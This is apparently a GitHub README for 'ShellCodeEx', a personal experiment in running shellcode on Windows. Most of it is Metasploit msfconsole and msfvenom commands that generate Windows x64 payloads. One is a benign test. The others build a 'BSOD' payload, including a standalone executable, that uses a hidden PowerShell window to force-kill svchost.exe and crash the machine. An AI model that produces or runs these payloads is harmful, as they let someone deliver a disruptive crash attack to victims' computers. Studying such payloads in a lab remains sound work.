# ShellCodeEx

[![](https://img.shields.io/badge/platform-Windows-informational)](https://github.com/Zalexanninev15/ShellCodeEx)
[![](https://img.shields.io/badge/written_on-C-000000.svg?logo=c)](https://github.com/Zalexanninev15/ShellCodeEx)
[![](https://img.shields.io/badge/written_on-.NET_9-651DE5.svg?logo=dotnet)](https://dotnet.microsoft.com/download/dotnet/6.0)
[![](https://img.shields.io/badge/written_on-C%23-%23239120.svg?logo=sharp&logoColor=white)](https://github.com/Zalexanninev15/SharkRemoteV4)
[![](https://img.shields.io/github/v/release/Zalexanninev15/ShellCodeEx)](https://github.com/Zalexanninev15/ShellCodeEx/releases/latest)
[![](https://img.shields.io/github/downloads/Zalexanninev15/ShellCodeEx/total.svg)](https://github.com/Zalexanninev15/ShellCodeEx/releases)
[![](https://img.shields.io/github/last-commit/Zalexanninev15/ShellCodeEx/main.svg)](https://github.com/Zalexanninev15/ShellCodeEx/commits/main)
[![](https://img.shields.io/github/stars/Zalexanninev15/ShellCodeEx.svg)](https://github.com/Zalexanninev15/ShellCodeEx/stargazers)
[![](https://img.shields.io/github/forks/Zalexanninev15/ShellCodeEx.svg)](https://github.com/Zalexanninev15/ShellCodeEx/network/members)
[![](https://img.shields.io/badge/license-GPLv3-ligthgreen.svg)](LICENSE)
[![](https://img.shields.io/badge/Donate-FFDD00.svg?logo=buymeacoffee&logoColor=black)](https://z15.neocities.org/donate)

## Description

My personal experiment on executing shellcode on Windows.

## Kali Linux commands for generate shellcode

### Test shellcode (need PowerShell 7 on Windows):

```bash
msfconsole -x "use payload/windows/x64/exec; set CMD 'pwsh -CommandWithArgs \"ls\" && pause'; generate -f ps1"
```

### Generate BSOD (building an executable file)

```bash
msfvenom --platform windows --arch x64 -p windows/x64/exec CMD='cmd.exe /c start /min powershell -Command "Start-Process cmd -ArgumentList \"/c taskkill /F /IM svchost.exe\" -WindowStyle Hidden"' -b '\x00\x0A\x0D' -f exe -o bsod_kali.exe
```

### Generate BSOD

```bash
> msfconsole
> use payload/windows/x64/exec
> set CMD cmd.exe /c start /min powershell -Command \"Start-Process cmd -ArgumentList \\\"/c taskkill /F /IM svchost.exe\\\" -WindowStyle Hidden\"
```
